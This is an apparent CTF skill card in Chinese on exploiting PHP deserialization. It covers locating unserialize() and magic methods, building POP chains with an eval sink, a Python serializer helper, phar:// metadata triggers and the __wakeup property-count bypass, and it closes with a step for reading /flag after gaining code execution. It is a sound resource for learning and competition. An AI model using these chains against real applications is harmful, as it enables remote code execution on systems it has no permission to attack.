---
name: web/php-deserialization
description: PHP 反序列化：POP 链、魔术方法、phar 触发点
when_to_use: 源码里有 unserialize()，或题目给了 class 定义 / phar 文件
categories: [web]
keywords: [php, unserialize, phar, pop chain, 反序列化]
---
## 定位入口

`grep -rn "unserialize\|__destruct\|__wakeup\|__toString\|__invoke" .`

## 手工造链

从可控的 `unserialize` 入参出发，逆向找“能走到危险函数”的方法链：

```php
<?php
class A { public $cmd; function __destruct(){ eval($this->cmd); } }
echo serialize(new A());
```
常见危险汇：`system`/`exec`/`eval`/`include`/`file_put_contents`/`call_user_func`。

## 私有属性与类型

- private → `\x00Class\x00prop`，public → 普通键
- 数字长度必须精确（`s:5:"hello";`），用 python 脚本拼更省事：

```python
def php_obj(cls, props):
    body = "".join(f's:{len(k)}:"{k}";{v}' for k, v in props.items())
    return f'O:{len(cls)}:"{cls}":{len(props)}:{{{body}}}'
```

## phar:// 触发

即使没有 `unserialize`，只要存在文件操作且 PHP<8.0：
上传一个 phar（改后缀），再 `file_exists('phar://upload/x.phar')` → 元数据反序列化。

```php
$p = new Phar('a.phar'); $p['x'] = 'x';
$p->setMetadata(new A()); $p->stopBuffering();
```

## 绕过 __wakeup（PHP7.4-）

`O:4:"Test":2:{...}` 改成 `O:4:"Test":3:{...}`（属性数大于实际）可跳过 `__wakeup`；
PHP 7.4.29+ 已修，注意版本。

## 收尾

拿到 RCE 后先 `<?php echo file_get_contents('/flag');`，再 `ls /` 找真 flag 路径。
